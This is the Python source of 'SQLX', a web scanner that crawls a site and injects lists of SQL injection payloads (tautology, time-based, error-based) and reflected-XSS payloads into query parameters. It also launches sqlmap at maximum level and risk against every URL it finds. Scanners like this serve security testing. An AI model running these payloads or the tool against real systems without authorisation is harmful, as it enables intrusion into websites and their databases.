import requests
import argparse
from urllib.parse import urljoin, urlparse, urlencode
import subprocess
from bs4 import BeautifulSoup

#  -------------------
# | GLOBAL CONSTANT'S |
# -------------------

SQLI_PAYLOADS = [
    "'",
    "' OR 1=1 --", # Authentication Bypass (Tautology)
    '" OR 1=1 --', # Authentication Bypass (Tautology)
    "' OR 1=1#", # Authentication Bypass (Tautology)
    "' OR 1=1/*", # Authentication Bypass (Tautology)
    "' OR '1'='1", # Authentication Bypass (Tautology)
    "' OR 1=1-- -", # Authentication Bypass (Tautology)
    "' ORDER BY 1--", # UNION-Based SQLi
    "' ORDER BY 10--", # UNION-Based SQLi
    "' AND 1=1--", # Blind Boolean-Based SQLi
    "' AND 1=2--", # Blind Boolean-Based SQLi
    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", # Blind Time-Based SQLi
    "x'XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR'z", # Blind Time-Based SQLi
    "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", # Blind Time-Based SQLi
    "'; IF (1=1) WAITFOR DELAY '0:0:5'--", # Blind Time-Based SQLi,
    "' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--", # Error-Based SQLi
    "' AND 1=CONVERT(int, (SELECT @@version))--", # Error-Based SQLi
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--" # Error-Based SQLi
    
]

XSS_PAYLOADS = [
    "<svg/onload='alert(1)'><svg>",
    "<svg onload='alert(1)'><svg>",
    "<svg	onload='alert(1)'><svg>",
    "<svg onload='alert(1)'><svg>",
    "<img src='x' onerror='alert(1)'>",
    "<script>alert(1)</script> ",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>"
]

TIMEOUT=5


def banner():
    print("""
 ___________________________________________________
| ================================================= | 
|| ███████╗ ██████╗ ██╗                   ██╗  ██╗ ||
|| ██╔════╝██╔═══██╗██║                   ╚██╗██╔╝ ||
|| ███████╗██║   ██║██║         █████╗     ╚███╔╝  ||
|| ╚════██║██║▄▄ ██║██║         ╚════╝     ██╔██╗  ||
|| ███████║╚██████╔╝███████╗              ██╔╝ ██╗ ||
|| ╚══════╝ ╚══▀▀═╝ ╚══════╝              ╚═╝  ╚═╝ ||
+ ------------------------------------------------- +
| ================== by Hanamaru ================== |                                               
+ -------------------____________------------------ +   

    """)

def is_valid_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ("http", "https")

def is_same_domain(base_url, target_url):
    return urlparse(base_url).netloc == urlparse(target_url).netloc

def crawler(start_url):
    to_visit = [start_url]
    visited = set()

    urls = []

    while to_visit:
        current_url = to_visit.pop(0)

        if current_url in visited:
            continue

        visited.add(current_url)

        try:
            response = requests.get(current_url, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        
        urls.append(current_url)

        soup = BeautifulSoup(response.text, "html.parser")

        for link in soup.find_all("a"):
            href = link.get("href")

            if not href:
                continue

            full_url = urljoin(current_url, href)

            if not is_valid_url(full_url):
                continue

            if not is_same_domain(start_url, full_url):
                continue

            if full_url not in visited and full_url not in to_visit:
                to_visit.append(full_url)
    
    return urls

def extract_get_parameters(url):
    parsed = urlparse(url)
    params = {}

    if parsed.query:
        for pair in parsed.query.split("&"):
            if "=" in pair:
                key, _ = pair.split("=", 1)
                params[key] = "test"
    
    return params

def scan_sqli(url):
    params = extract_get_parameters(url)

    #Base request (without payload)
    base_query = urlencode(params)
    base_url = f"{url.split('?')[0]}?{base_query}"

    try:
        base_response =  requests.get(base_url, timeout=TIMEOUT)
        base_len = len(base_response.text)
    except requests.RequestException:
        return
    
    for param in params:
        for payload in SQLI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload

            query = urlencode(test_params)
            test_url = f"{url.split('?')[0]}?{query}"

            try:
                response = requests.get(test_url, timeout=TIMEOUT)
            except requests.RequestException:
                continue

            # Simple Heuristic:
            # Diference in size of response
            diff = abs(len(response.text) - base_len)

            if diff > 50:
                print("-" * 60)
                print("*" * 60)
                print("[+] FOUND A POSSIBLE SQL INJECTION\n")
                print("*" * 60)
                print("-" * 60)
                print(f"    URL: {test_url}")
                print(f"    Parameters: {param}")
                print(f"    Payload: {payload}")
                print(f"    Response's diference: {diff}")
                print("-" * 60)
                print("\n")

def scan_xss(url):
    params = extract_get_parameters(url)

    if not params:
        return
    
    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload

            query = urlencode(test_params)
            test_url = f"{url.split('?')[0]}?{query}"

            try:
                response = requests.get(test_url, timeout=TIMEOUT)
            except requests.RequestException:
                continue

            if payload in response.text:
                print("-" * 60)
                print("*" * 60)
                print("[+] FOUND A POSSIBLE REFLECTED XSS\n")
                print("*" * 60)
                print("-" * 60)
                print(f"    URL: {test_url}")
                print(f"    Parameters: {param}")
                print(f"    Payload: {payload}")
                print("-" * 60)
                print("\n")

def run_sqlmap(url):
    cmd = [
        "python", 
        "sqlmap.py", 
        "-u", 
        url, 
        "--batch",
        "--level=5",
        "--risk=3",
        "--random-agent"
    ]

    result = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        creationflags=subprocess.CREATE_NEW_CONSOLE
    )

    full_output = ""

    for line in iter(result.stdout.readline, ''):
        print(line, end="")     # mostra no terminal
        full_output += line     # salva tudo

    result.stdout.close()
    result.wait()
    
    for output in full_output:
        print(output)

# =====================
# Main execution
# =====================

def main():
    banner()
    parser = argparse.ArgumentParser(prog="SQLX", description="SQLX - A SQLI and XSS Scaner.")
    parser.add_argument("--url", "-u", help='example: http://testphp.vulnweb.com')
    args = parser.parse_args()
   
    print(f"[*] Starting crawler at {args.url} ...")
    urls = crawler(args.url)

    print(f"[*] Total URLs has found: {len(urls)}\n")

    print(f"[*] Starting XSS and SQLI scanners...\n")

    for url in urls:
        scan_xss(url)
        scan_sqli(url)
        run_sqlmap(url)
        
    
    print("Scans has been finshed.")

if __name__ == "__main__":
    main()
